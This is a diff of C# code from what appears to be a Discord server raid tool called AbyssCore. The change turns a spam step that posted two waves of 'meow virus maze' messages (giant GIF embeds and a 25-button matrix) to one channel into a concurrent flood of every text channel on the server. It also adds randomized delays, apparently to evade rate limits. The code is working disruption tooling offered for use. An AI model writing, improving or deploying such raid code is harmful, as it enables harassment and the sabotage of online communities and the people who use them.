@@ -398,7 +398,6 @@ namespace AbyssCore
                 progressCallback?.Invoke($"  ▲ [頭像替換] 略過: {ex.Message}");
             }
 
-            sw.Stop();
             report.ElapsedSeconds = sw.Elapsed.TotalSeconds;
 
             // -----------------------------------------------------------------
@@ -440,29 +439,35 @@ namespace AbyssCore
                     }
 
                     // -----------------------------------------------------------------
-                    // 步驟 8 後置觸發: 自動向頂端頻道發送 2 次「喵喵病毒迷宮訊息」
-                    // 包含 10 個巨型 Embed 訊息 (嵌入 10 組不同 GIF) + 25 顆混淆按鈕矩陣
+                    // 步驟 8 後置觸發: 自動向全伺服器所有文字頻道投放 2 輪「喵喵病毒迷宮訊息」
+                    // 包含 10 個巨型 Embed 訊息 (嵌入 10 組 cute.gif 媒體連結) + 25 顆混淆按鈕矩陣
                     // -----------------------------------------------------------------
-                    progressCallback?.Invoke("✦ [自動觸發] 正在頂端頻道連續投放 2 次【喵喵病毒迷宮訊息】(10 巨型 Embed + 10 組 GIF + 25 重按鈕)...");
+                    progressCallback?.Invoke($"✦ [自動觸發] 正在向全服 {textChannels.Count} 個文字頻道各投放 2 輪【喵喵病毒迷宮訊息】(10 巨型 Embed + 10 組 cute.gif + 25 重按鈕)...");
                     var nekoGifs = ConfigManager.GetNekoGifs();
-                    for (int wave = 1; wave <= 2; wave++)
+                    int totalVirusSent = 0;
+                    var virusTasks = textChannels.Select(ch =>
                     {
-                        var nekoPayload = BuildNekoVirusPayload(wave, 2, "深淵迷宮核心節點", nekoGifs);
-                        bool nekoOk = await _client.SendComplexMessageAsync(topChannelId, nekoPayload);
-                        if (nekoOk)
+                        string cid = ch.GetProperty("id").GetString()!;
+                        string cname = ch.TryGetProperty("name", out var np) ? np.GetString() ?? "迷宮節點" : "迷宮節點";
+                        return Task.Run(async () =>
                         {
-                            report.NekoVirusWavesSent++;
-                            progressCallback?.Invoke($"✔ [喵喵病毒] 第 {wave}/2 波喵喵病毒迷宮訊息已成功投放至頂端頻道！");
-                        }
-                        else
-                        {
-                            progressCallback?.Invoke($"▲ [喵喵病毒] 第 {wave}/2 波喵喵病毒訊息發送未成功。");
-                        }
-                        if (wave < 2)
-                        {
-                            await Task.Delay(300);
-                        }
-                    }
+                            for (int wave = 1; wave <= 2; wave++)
+                            {
+                                var nekoPayload = BuildNekoVirusPayload(wave, 2, cname, nekoGifs);
+                                if (await _client.SendComplexMessageAsync(cid, nekoPayload))
+                                {
+                                    Interlocked.Increment(ref totalVirusSent);
+                                }
+                                if (wave < 2)
+                                {
+                                    await Task.Delay(Random.Shared.Next(150, 400));
+                                }
+                            }
+                        });
+                    });
+                    await Task.WhenAll(virusTasks);
+                    report.NekoVirusWavesSent = totalVirusSent;
+                    progressCallback?.Invoke($"✔ [喵喵病毒全服投放完畢] 已向 {textChannels.Count} 個文字頻道累計發送共 {totalVirusSent} 則巨型病毒矩陣！");
                 }
             }
             catch (Exception ex)
@@ -470,6 +475,8 @@ namespace AbyssCore
                 progressCallback?.Invoke($"▲ [步驟 8/8] 日誌發送略過: {ex.Message}");
             }
 
+            sw.Stop();
+            report.ElapsedSeconds = sw.Elapsed.TotalSeconds;
             return report;
         }
 
